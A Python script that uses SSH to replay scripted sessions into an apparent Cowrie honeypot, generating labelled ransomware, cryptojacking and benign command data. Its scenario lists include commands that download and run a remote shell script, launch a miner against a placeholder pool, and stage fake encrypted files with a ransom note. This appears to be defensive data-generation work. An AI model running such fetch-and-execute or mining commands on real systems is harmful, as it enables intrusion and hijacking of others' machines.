import argparse
import getpass
import time

import paramiko


RANSOMWARE_SCENARIOS = [
    [
        "echo SHADOWAUTH_CONTROLLED_RANSOMWARE_V1",
        "whoami",
        "uname -a",
        "find /opt/banco-andino -type f",
        "wget http://192.168.2.27:8080/ransomware-sim.sh -O /tmp/ransomware-sim.sh",
        "chmod +x /tmp/ransomware-sim.sh",
        "sh /tmp/ransomware-sim.sh",
        "touch /tmp/clientes.csv /tmp/pagos.sql /tmp/backup.zip",
        "cp /tmp/clientes.csv /tmp/clientes.csv.locked",
        "cp /tmp/pagos.sql /tmp/pagos.sql.locked",
        "cp /tmp/backup.zip /tmp/backup.zip.locked",
        "echo 'SHADOWAUTH SIMULATION - RESTORE FILES' > /tmp/README_RESTORE_FILES.txt",
        "find /tmp -name '*.locked'",
    ],
    [
        "echo SHADOWAUTH_CONTROLLED_RANSOMWARE_V1",
        "pwd",
        "ls -la /opt/banco-andino",
        "find /opt/banco-andino -type f | head",
        "curl -fsSL http://192.168.2.27:8080/ransomware-sim.sh -o /var/tmp/ransomware-sim.sh",
        "chmod +x /var/tmp/ransomware-sim.sh",
        "sh /var/tmp/ransomware-sim.sh",
        "touch /var/tmp/accounts.csv /var/tmp/transactions.sql",
        "cp /var/tmp/accounts.csv /var/tmp/accounts.csv.encrypted",
        "cp /var/tmp/transactions.sql /var/tmp/transactions.sql.encrypted",
        "echo 'SIMULATED RECOVERY NOTE' > /var/tmp/RECOVER_FILES.txt",
        "ls -la /var/tmp",
    ],
]


CRYPTOJACKING_SCENARIOS = [
    [
        "echo SHADOWAUTH_CONTROLLED_CRYPTOJACKING_V1",
        "whoami",
        "uname -a",
        "nproc",
        "cat /proc/cpuinfo | head",
        "free -m",
        "wget http://192.168.2.27:8080/xmrig-sim.sh -O /tmp/xmrig",
        "chmod +x /tmp/xmrig",
        "/tmp/xmrig --url stratum+tcp://pool.invalid:3333 --user TEST_WALLET --threads=2",
        "ps aux | grep xmrig",
    ],
    [
        "echo SHADOWAUTH_CONTROLLED_CRYPTOJACKING_V1",
        "uname -s -m",
        "nproc",
        "grep -m1 'model name' /proc/cpuinfo",
        "free -m",
        "curl -fsSL http://192.168.2.27:8080/xmrig-sim.sh -o /var/tmp/miner",
        "chmod +x /var/tmp/miner",
        "/var/tmp/miner --pool pool.invalid:3333 --wallet TEST_WALLET",
        "pgrep -af miner",
    ],
]


BENIGN_SCENARIOS = [
    [
        "echo SHADOWAUTH_CONTROLLED_BENIGN_V1",
        "whoami",
        "pwd",
        "ls",
        "date",
        "uname -a",
    ],
    [
        "echo SHADOWAUTH_CONTROLLED_BENIGN_V1",
        "pwd",
        "cd /opt",
        "ls",
        "date",
    ],
    [
        "echo SHADOWAUTH_CONTROLLED_BENIGN_V1",
        "whoami",
        "uname -s -m",
        "ls -la",
        "pwd",
    ],
]


def run_session(
    host,
    port,
    username,
    password,
    commands,
):
    client = paramiko.SSHClient()

    client.set_missing_host_key_policy(
        paramiko.AutoAddPolicy()
    )

    client.connect(
        hostname=host,
        port=port,
        username=username,
        password=password,
        allow_agent=False,
        look_for_keys=False,
        timeout=10,
        banner_timeout=10,
        auth_timeout=10,
    )

    channel = client.invoke_shell()

    time.sleep(0.5)

    for command in commands:
        channel.send(command + "\n")
        time.sleep(0.35)

    channel.send("exit\n")

    time.sleep(0.5)

    channel.close()
    client.close()


def generate(
    label,
    scenarios,
    count,
    args,
    password,
):
    print()
    print("=" * 70)
    print(label)
    print("=" * 70)

    for number in range(count):

        scenario = scenarios[
            number % len(scenarios)
        ]

        print(
            f"[{number + 1}/{count}] "
            f"{label}"
        )

        try:
            run_session(
                host=args.host,
                port=args.port,
                username=args.username,
                password=password,
                commands=scenario,
            )

            print("  OK")

        except Exception as exc:
            print(
                "  ERROR:",
                exc,
            )

        time.sleep(0.7)


def main():

    parser = argparse.ArgumentParser()

    parser.add_argument(
        "--host",
        default="192.168.2.27",
    )

    parser.add_argument(
        "--port",
        type=int,
        default=2222,
    )

    parser.add_argument(
        "--username",
        required=True,
    )

    parser.add_argument(
        "--count",
        type=int,
        default=15,
        help="Sessions per category",
    )

    args = parser.parse_args()

    password = getpass.getpass(
        "Cowrie password: "
    )

    generate(
        "CONTROLLED RANSOMWARE",
        RANSOMWARE_SCENARIOS,
        args.count,
        args,
        password,
    )

    generate(
        "CONTROLLED CRYPTOJACKING",
        CRYPTOJACKING_SCENARIOS,
        args.count,
        args,
        password,
    )

    generate(
        "CONTROLLED BENIGN",
        BENIGN_SCENARIOS,
        args.count,
        args,
        password,
    )

    print()
    print("=" * 70)
    print("CONTROLLED DATA GENERATION FINISHED")
    print("=" * 70)


if __name__ == "__main__":
    main()
